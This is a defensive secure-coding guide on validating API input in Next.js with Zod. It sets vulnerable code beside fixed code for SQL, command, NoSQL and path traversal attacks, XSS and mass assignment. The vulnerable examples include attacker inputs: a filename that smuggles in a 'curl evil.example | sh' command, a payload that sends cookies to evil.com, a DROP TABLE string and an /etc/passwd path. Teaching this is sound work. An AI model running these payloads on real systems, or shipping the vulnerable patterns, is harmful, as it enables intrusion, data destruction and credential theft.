# Input Validation

> OWASP API3:2023 (Broken Object Property Level Authorization), API8:2023 (Security Misconfiguration), A05:2025 (Injection)

Every piece of data from the client is hostile until validated. TypeScript types disappear at runtime — they provide zero security.

## Contents

- [The Rule](#the-rule)
- [Server Action Validation](#server-action-validation)
- [Route Handler Validation](#route-handler-validation)
- [Mass Assignment Prevention](#mass-assignment-prevention)
- [SQL Injection Prevention](#sql-injection-prevention)
- [Command Injection (A05:2025)](#command-injection-a052025)
- [NoSQL Operator Injection (A05:2025)](#nosql-operator-injection-a052025)
- [XSS Prevention](#xss-prevention)
- [Path Traversal Prevention](#path-traversal-prevention)
- [Common Zod Patterns for API Input](#common-zod-patterns-for-api-input)
- [Audit Patterns](#audit-patterns)
- [Sources](#sources)

## The Rule

**Validate all input on the server, at the boundary, before any logic runs.**

```
Client Input → Zod Schema → Validated Data → Business Logic → Database
                  ↑                                              ↑
          reject here                                parameterized queries
```

## Server Action Validation

Server Actions receive untyped input from `FormData` or direct arguments. Always validate.

```tsx
// FAIL — trusting client input types
'use server'
export async function createPost(title: string, body: string) {
  // TypeScript says these are strings — at runtime they could be anything
  await db.insert(posts).values({ title, body, authorId: user.id })
}

// PASS — validate with Zod
'use server'
import { z } from 'zod'
import { getCurrentUser } from '@/data/auth'

const CreatePostSchema = z.object({
  title: z.string().min(1).max(200).trim(),
  body: z.string().min(1).max(10000).trim(),
})

export async function createPost(input: unknown) {
  const user = await getCurrentUser()
  if (!user) throw new Error('Unauthorized')

  const parsed = CreatePostSchema.safeParse(input)
  if (!parsed.success) {
    return { error: z.flattenError(parsed.error).fieldErrors }
  }

  await db.insert(posts).values({
    title: parsed.data.title,
    body: parsed.data.body,
    authorId: user.id,
  })
}
```

Zod 4 deprecates `error.flatten()` and `error.format()`. Use `z.flattenError(error)` for one level of `fieldErrors` and `formErrors`, or `z.treeifyError(error)` for nested schemas.

### FormData Validation

```tsx
// PASS — validate FormData with Zod
'use server'
const ContactSchema = z.object({
  email: z.email(),
  message: z.string().min(10).max(5000).trim(),
})

export async function submitContact(formData: FormData) {
  const parsed = ContactSchema.safeParse({
    email: formData.get('email'),
    message: formData.get('message'),
  })

  if (!parsed.success) {
    return { error: z.flattenError(parsed.error).fieldErrors }
  }

  await sendEmail(parsed.data.email, parsed.data.message)
}
```

## Route Handler Validation

```tsx
// FAIL — no validation, trusts JSON body
export async function POST(request: Request) {
  const body = await request.json()
  await db.insert(users).values(body)  // mass assignment — inserts ANY fields
}

// PASS — strict schema validation
import { z } from 'zod'

const CreateUserSchema = z.strictObject({
  name: z.string().min(1).max(100).trim(),
  email: z.email().transform((value) => value.toLowerCase()),
})  // unknown keys are rejected

export async function POST(request: Request) {
  const user = await getCurrentUser()
  if (!user?.isAdmin) {
    return Response.json({ error: 'Forbidden' }, { status: 403 })
  }

  let body: unknown
  try {
    body = await request.json()
  } catch {
    return Response.json({ error: 'Invalid JSON' }, { status: 400 })
  }

  const parsed = CreateUserSchema.safeParse(body)
  if (!parsed.success) {
    return Response.json(
      { error: z.flattenError(parsed.error).fieldErrors },
      { status: 422 }
    )
  }

  const [newUser] = await db.insert(users).values(parsed.data).returning({
    id: users.id,
    name: users.name,
    email: users.email,
  })
  return Response.json(newUser, { status: 201 })
}
```

## Mass Assignment Prevention

API3 (Broken Object Property Level Authorization) — attackers send extra fields to modify properties they shouldn't.

```tsx
// FAIL — spreading request body into update
export async function PATCH(request: Request) {
  const body = await request.json()
  await db.update(users).set(body).where(eq(users.id, userId))
  // Attacker sends: { "name": "Alice", "role": "admin", "verified": true }
}

// PASS — explicit field selection with z.strictObject()
const UpdateProfileSchema = z.strictObject({
  name: z.string().min(1).max(100).trim().optional(),
  bio: z.string().max(500).trim().optional(),
})  // rejects "role", "verified", or any other field

export async function PATCH(request: Request) {
  const user = await getCurrentUser()
  if (!user) return Response.json({ error: 'Unauthorized' }, { status: 401 })

  const parsed = UpdateProfileSchema.safeParse(await request.json())
  if (!parsed.success) {
    return Response.json({ error: z.flattenError(parsed.error) }, { status: 422 })
  }

  await db.update(users).set(parsed.data).where(eq(users.id, user.id))
  return Response.json({ success: true })
}
```

## SQL Injection Prevention

```tsx
// FAIL — string concatenation in SQL
const result = await db.execute(
  `SELECT * FROM users WHERE email = '${email}'`
  // Attacker sends: ' OR 1=1 --
)

// PASS — parameterized queries with tagged templates
import { sql } from 'drizzle-orm'
const result = await db.execute(
  sql`SELECT * FROM users WHERE email = ${email}`
)

// PASS — ORM methods (Drizzle) — always parameterized
const result = await db
  .select()
  .from(users)
  .where(eq(users.email, email))

// PASS — Prisma — always parameterized
const result = await prisma.user.findUnique({
  where: { email },
})
```

### Dynamic Column/Table Names

Column and table names **cannot** be parameterized. Validate against an allowlist.

```tsx
// FAIL — user controls sort column
const sortBy = searchParams.get('sort')  // attacker sends: "name; DROP TABLE users"
const result = await db.execute(
  sql`SELECT * FROM users ORDER BY ${sql.raw(sortBy)}`
)

// PASS — validate against allowlist
const ALLOWED_SORT_COLUMNS = new Set(['name', 'email', 'createdAt'])

const sortBy = searchParams.get('sort') ?? 'createdAt'
if (!ALLOWED_SORT_COLUMNS.has(sortBy)) {
  return Response.json({ error: 'Invalid sort field' }, { status: 400 })
}

const result = await db
  .select()
  .from(users)
  .orderBy(users[sortBy as keyof typeof users])
```

## Command Injection (A05:2025)

`exec()` hands one string to `/bin/sh` (or `cmd.exe`), so `;`, `|`, `$()` and backticks in user input run as commands. `execFile()` and `spawn()` start the program directly, with each argument as a separate array item and no shell, unless you pass `shell: true`.

```tsx
// FAIL: user input inside a shell string
import { exec } from 'node:child_process'

export async function POST(request: Request) {
  const { filename } = await request.json()
  exec(`convert uploads/${filename} -resize 200x200 thumbs/${filename}`)
  // filename: "a.png; curl https://evil.example/x | sh"
}

// PASS: no shell, argument array, validated input, fixed program
import { execFile } from 'node:child_process'
import { promisify } from 'node:util'
import { z } from 'zod'

const run = promisify(execFile)
const ThumbSchema = z.object({ id: z.uuid() }) // our ID, not a filename

export async function POST(request: Request) {
  const parsed = ThumbSchema.safeParse(await request.json().catch(() => null))
  if (!parsed.success) return Response.json({ error: 'Invalid input' }, { status: 400 })

  const { id } = parsed.data
  await run('convert', [`uploads/${id}.png`, '-resize', '200x200', `thumbs/${id}.png`], {
    timeout: 10_000,
  })
  return Response.json({ ok: true })
}
```

| Rule | Why |
|------|-----|
| Use a library call instead of a command when one exists | No interpreter, no injection |
| `execFile` or `spawn` with an array, never `exec` or `shell: true` | Shell metacharacters stay literal text |
| Allowlist the program, validate each argument | No shell still lets a value become an option such as `--output=/etc/x` |
| Put `--` before user values when the tool supports it | Ends option parsing, so `-rf` stays a filename |
| On Windows, `.bat` and `.cmd` need a shell | Avoid running them with user input at all |
| Run with the least privilege | Limits what a successful injection can do |

## NoSQL Operator Injection (A05:2025)

MongoDB builds queries from objects, so string concatenation is rarely the problem. The problem is a value that should be a string arriving as an object. JSON bodies, and query-string parsers that support `a[b]=c`, can both produce one.

```tsx
// FAIL: the body's values go straight into the filter
export async function POST(request: Request) {
  const { email, password } = await request.json()
  const user = await usersCollection.findOne({ email, password: hash(password) })
  // Body: { "email": { "$ne": null }, ... } matches the first user in the collection
}

// FAIL: a reset token lookup with no type check
const record = await tokens.findOne({ token: body.token }) // { "$gt": "" } matches any token

// PASS: Zod pins every field to a scalar before the filter is built
import { z } from 'zod'

const LoginSchema = z.strictObject({
  email: z.email(),
  password: z.string().min(1).max(1024),
})

export async function POST(request: Request) {
  const parsed = LoginSchema.safeParse(await request.json().catch(() => null))
  if (!parsed.success) return Response.json({ error: 'Invalid email or password' }, { status: 400 })

  const user = await usersCollection.findOne({ email: parsed.data.email }) // a string, never an object
  if (!user || !(await verifyPassword(parsed.data.password, user.passwordHash))) {
    return Response.json({ error: 'Invalid email or password' }, { status: 401 })
  }
  // ...
}
```

- Validate the type of every field that reaches a filter. `z.string()` rejects `{ "$ne": null }`
- Never pass a client object through as a filter, sort, or projection. Build it from validated scalars
- Allowlist field names the client may filter or sort on, as with SQL columns above
- Do not accept `$where`, `$expr`, `$function`, or `$regex` from the client. `$where` runs JavaScript inside the database
- Turn off server-side JavaScript in MongoDB when you do not need it
- A check that rejects strings starting with `$` is weaker than a schema. It does not check types or fields

## XSS Prevention

React escapes rendered content by default. The danger is `dangerouslySetInnerHTML` and unescaped contexts.

```tsx
// FAIL — rendering user HTML directly
function Comment({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />
}
// Attacker stores: <img src=x onerror="document.location='https://evil.com?c='+document.cookie">

// PASS — sanitize if you must render HTML
import DOMPurify from 'isomorphic-dompurify'

function Comment({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href'],
  })
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}

// BEST — use markdown rendering instead of raw HTML
import { marked } from 'marked'

function Comment({ markdown }: { markdown: string }) {
  const html = DOMPurify.sanitize(marked.parse(markdown))
  return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```

### URL Injection

In React DOM 19.2.4, React rewrites a `javascript:` href to a URL that throws, so that href does not execute the supplied script. Its URL sanitizer does not reject `data:` URLs. Imperative assignments such as `window.location = value` are outside this React check. Keep an http(s) allowlist for untrusted link destinations.

```tsx
function SafeLink({ href, children }: { href: string; children: React.ReactNode }) {
  const isValid = /^https?:\/\//i.test(href)
  if (!isValid) return <span>{children}</span>
  return <a href={href} rel="noopener noreferrer">{children}</a>
}
```

## Path Traversal Prevention

```tsx
// FAIL — user controls file path
export async function GET(request: Request) {
  const url = new URL(request.url)
  const file = url.searchParams.get('file')
  const content = await fs.readFile(`./uploads/${file}`)  // ../../../etc/passwd
  return new Response(content)
}

// PASS — validate and resolve path
import path from 'path'

const UPLOAD_DIR = path.resolve('./uploads')

export async function GET(request: Request) {
  const url = new URL(request.url)
  const file = url.searchParams.get('file')
  if (!file) return Response.json({ error: 'Missing file' }, { status: 400 })

  const resolved = path.resolve(UPLOAD_DIR, path.basename(file))
  if (!resolved.startsWith(UPLOAD_DIR)) {
    return Response.json({ error: 'Invalid path' }, { status: 400 })
  }

  try {
    const content = await fs.readFile(resolved)
    return new Response(content)
  } catch {
    return Response.json({ error: 'Not found' }, { status: 404 })
  }
}
```

## Common Zod Patterns for API Input

```tsx
// Pagination
const PaginationSchema = z.object({
  page: z.coerce.number().int().min(1).default(1),
  limit: z.coerce.number().int().min(1).max(100).default(20),
})

// Search with sanitization
const SearchSchema = z.object({
  q: z.string().max(200).trim(),
  category: z.enum(['all', 'posts', 'users']).default('all'),
})

// File upload metadata. These are the client's claims. Check the bytes too: file-uploads.md
const UploadSchema = z.object({
  filename: z.string().max(255).regex(/^[a-zA-Z0-9._-]+$/),
  contentType: z.enum(['image/jpeg', 'image/png', 'image/webp', 'application/pdf']),
  size: z.number().int().max(10 * 1024 * 1024),  // 10MB max
})

// Date range
const DateRangeSchema = z.object({
  from: z.coerce.date(),
  to: z.coerce.date(),
}).refine(data => data.from < data.to, {
  message: 'Start date must be before end date',
})

// ID parameter (from route params)
const IdSchema = z.object({
  id: z.cuid2(),  // or z.uuid(), depending on your ID format
})
```

## Audit Patterns

```bash
# Find raw SQL string concatenation
grep -rn "execute\|query\|raw" --include="*.ts" | grep -v "sql\`\|prisma\.\|drizzle"

# Find dangerouslySetInnerHTML without DOMPurify
grep -rn "dangerouslySetInnerHTML" --include="*.tsx" | grep -v "DOMPurify\|sanitize"

# Find Server Actions without Zod validation
grep -rln "'use server'" --include="*.ts" | xargs grep -L "safeParse\|z\.parse\|Schema\.parse\|zod"

# Find Route Handlers without input validation
find . -name "route.ts" | xargs grep -L "safeParse\|parse(\|zod\|z\."

# Find request.json() not followed by validation
grep -rn "request.json()" --include="*.ts" -A5 | grep -v "safeParse\|parse(\|Schema"
```

## Sources

- [OWASP API3:2023 — Broken Object Property Level Authorization](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/)
- [OWASP A05:2025 — Injection](https://top10.owasp.org/2025/A05_2025-Injection/)
- [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [Node.js 22 `child_process`](https://nodejs.org/docs/latest-v22.x/api/child_process.html)
- [OWASP NoSQL Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Security_Cheat_Sheet.html)
- [OWASP WSTG: Testing for NoSQL Injection](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Injection/05.6-NoSQL_Injection.md)
- [Zod error formatting](https://zod.dev/error-formatting) and [Zod 4 changelog](https://zod.dev/v4/changelog)
- [Next.js Data Security Guide](https://nextjs.org/docs/app/guides/data-security)
- [Zod Documentation](https://zod.dev)
- [React DOM 19.2.4 `sanitizeURL`](https://github.com/facebook/react/blob/v19.2.4/packages/react-dom-bindings/src/shared/sanitizeURL.js) (checked 2026-10-21; URL Injection section only)
